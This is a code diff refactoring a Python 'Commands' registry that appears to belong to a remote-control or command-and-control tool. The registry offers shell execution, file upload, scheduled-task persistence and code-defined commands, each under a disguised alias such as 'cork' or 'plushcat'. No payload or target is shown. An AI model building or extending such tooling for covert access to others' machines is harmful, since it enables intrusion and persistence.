@@ -1,13 +1,13 @@
 import json
 import random
-from typing import Dict
+from typing import Dict, List
 from models.encrypted_file import EncryptedFile
 from models.scheduale_task import SchedualerTask
 import os
 from models.command import Command
 
 
-def assign_alias(aliases):
+def assign_alias(aliases: list):
     choice = random.choice(aliases)
     aliases.remove(choice)
     return choice
@@ -17,8 +17,8 @@ class Commands:
     def __init__(self):
         self.aliases = ["cork", "craftbook", "hairribbon", "bottleofsunscreen", "hairtie", "spectacles", "speakers",
                         "handbag", "sidewalk", "plushcat", "stickofincense", "tweezers", "whistle", "quilt", "slipper"]
-        self.commands: Dict[str, Command] = {'cmd': RunInCMD(self.assign_alias(self.aliases)), 'upload': UploadFile(self.assign_alias(self.aliases)),
-                                             'schedule': AddToScheduler(self.assign_alias(self.aliases))}
+        self.commands: List[Command] = [RunInCMD(self.assign_alias(self.aliases)), UploadFile(self.assign_alias(self.aliases)),
+                                        AddToScheduler(self.assign_alias(self.aliases))]
         self.add_command = AddCommand(
             self.commands, {'name': '', 'from_file': 'False', 'code': ''}, 'file.txt', self.assign_alias(self.aliases), self.aliases)
         try:
@@ -26,31 +26,31 @@ class Commands:
         except Exception:
             print('no commands yet')
 
-    def find_by_alias(self, alias):
-        for name, command in self.commands.items():
+    def find_by_alias(self, alias: str) -> Command:
+        for command in self.commands:
             if command.alias == alias:
-                return name, command
+                return command
+        if alias == self.add_command.alias:
+            return self.add_command
         return
 
-    def run_command(self, name, params: Dict):
-        if name == 'add':
-            self.add_command.set_params(params)
-            return self.add_command.execute()
-        self.commands[name].set_params(params)
-        return self.commands[name].execute()
+    def run_command(self, alias: str, params: Dict):
+        command = self.find_by_alias(alias)
+        command.set_params(params)
+        return command.execute()
 
     def get_command(self, alias):
         try:
             command = self.find_by_alias(alias)
-            params = {'params': command[1].params,
-                      'name': command[0], 'alias': alias}
+            params = command.to_json()
         except KeyError:
             params = {}
         return params
 
     def get_all_commands(self):
-        commands = [self.get_command(command.alias) for command in self.commands.values()]
-        commands.append({'name': 'add', 'params': self.add_command.params})
+        commands = [command.to_json()
+                    for command in self.commands]
+        commands.append(self.add_command.to_json())
         return commands
 
 
